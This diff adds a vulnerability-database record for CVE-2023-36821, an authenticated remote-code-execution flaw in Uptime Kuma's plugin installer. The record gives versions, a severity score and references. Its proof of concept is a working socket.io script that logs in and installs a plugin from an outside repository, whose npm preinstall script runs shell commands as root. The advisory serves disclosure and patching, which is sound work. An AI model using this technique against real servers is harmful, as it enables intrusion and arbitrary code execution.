@@ -1,0 +1,127 @@
+advisory_id: GHSA-7grx-f945-mj96
+datasource_id: github_osv/GHSA-7grx-f945-mj96
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-7grx-f945-mj96/GHSA-7grx-f945-mj96.json
+aliases:
+  - CVE-2023-36821
+summary: |
+  Uptime Kuma vulnerable to authenticated remote code execution via malicious plugin installation
+  ### Summary
+  Installation of a maliciously crafted plugin allows for remote code execution by an authenticated attacker.
+
+  ### Details
+  Uptime Kuma allows authenticated users to install plugins from an official list of plugins. This feature is currently disabled in the web interface, but the corresponding API endpoints are still available after login.
+  After downloading a plugin, it's installed by calling `npm install` in the installation directory of the plugin:
+  https://github.com/louislam/uptime-kuma/blob/8c60e902e1c76ecbbd1b0423b07ce615341cb850/server/plugins-manager.js#L210-L216
+
+  Because the plugin is not validated against the official list of plugins or installed with `npm install --ignore-scripts`, a maliciously crafted plugin taking advantage of [npm scripts](https://docs.npmjs.com/cli/v9/using-npm/scripts) can gain remote code execution.
+
+  ### PoC
+  In the PoC below, the plugin at https://github.com/n-thumann/npm-install-script-poc will be installed. It only consists of an empty `index.js` and a `package.json` containing the script: `"preinstall": "echo \"Malicious code could have been executed as user $(whoami)\" > /tmp/poc"`. This will be executed when installing the plugin.
+
+  1. Start Uptime Kuma: `docker run -d -p 3001:3001 -v uptime-kuma:/app/data --name uptime-kuma louislam/uptime-kuma:1`
+  2. Create a user using the Uptime Kuma web interface, e.g. user `admin` with password `admin123`
+  3. Confirm that the PoC file to be created doesn't exist yet:
+  ```
+  ➜  ~ docker exec -it uptime-kuma cat /tmp/poc
+  cat: /tmp/poc: No such file or directory
+  ```
+  4. Create file `poc.js` with the following content:
+  ```
+  SERVER = "ws://localhost:3001";
+  USERNAME = "admin";
+  PASSWORD = "admin123";
+
+
+  const { io } = require("socket.io-client");
+  const socket = io(SERVER);
+  const repo = "https://github.com/n-thumann/npm-install-script-poc";
+  const name = "npm-install-script-poc";
+
+  socket.emit(
+    "login",
+    { username: USERNAME, password: PASSWORD, token: "" },
+    (res) => {
+      if (res.ok !== true) return console.log("Login failed");
+
+      console.log("Login successful");
+      socket.emit("installPlugin", repo, name, () => {
+        console.log("Done");
+        socket.close();
+      });
+    }
+  );
+  ```
+  5. Install `socket.io-client`: `npm install socket.io-client`
+  6. Run the script: `node poc.js`:
+  ```
+  # node poc.js
+  Login successful
+  Done
+  ```
+  7. The PoC file has been created:
+  ```
+  ➜  ~ docker exec -it uptime-kuma cat /tmp/poc
+  Malicious code could have been executed as user root
+  ```
+
+  ### Impact
+  This vulnerability allows authenticated attacker to gain remote code execution on the server Uptime Kuma is running on.
+impacted_packages:
+  - purl: pkg:npm/uptime-kuma
+    affected_versions: vers:npm/<=1.22.0
+    fixed_versions: vers:npm/1.22.1
+    affected_packages:
+      - pkg:npm/uptime-kuma@1.22.0
+    fixed_packages:
+      - pkg:npm/uptime-kuma@1.22.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/louislam/uptime-kuma
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/louislam/uptime-kuma
+        commit: 8c60e902e1c76ecbbd1b0423b07ce615341cb850
+        patch_text:
+      - vcs_url: https://github.com/louislam/uptime-kuma
+        commit: a0736e04b2838aae198c2110db244eab6f87757b
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '8.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-7grx-f945-mj96/GHSA-7grx-f945-mj96.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-20
+references:
+  - url: https://github.com/louislam/uptime-kuma
+    reference_type:
+    reference_id:
+  - url: https://github.com/louislam/uptime-kuma/blob/8c60e902e1c76ecbbd1b0423b07ce615341cb850/server/plugins-manager.js#L210-L216
+    reference_type:
+    reference_id:
+  - url: https://github.com/louislam/uptime-kuma/commit/a0736e04b2838aae198c2110db244eab6f87757b
+    reference_type:
+    reference_id:
+  - url: https://github.com/louislam/uptime-kuma/pull/3346
+    reference_type:
+    reference_id:
+  - url: https://github.com/louislam/uptime-kuma/releases/tag/1.22.1
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2023-36821
+    reference_type:
+    reference_id: CVE-2023-36821
+  - url: https://github.com/louislam/uptime-kuma/security/advisories/GHSA-7grx-f945-mj96
+    reference_type:
+    reference_id: GHSA-7grx-f945-mj96
+exploits: []
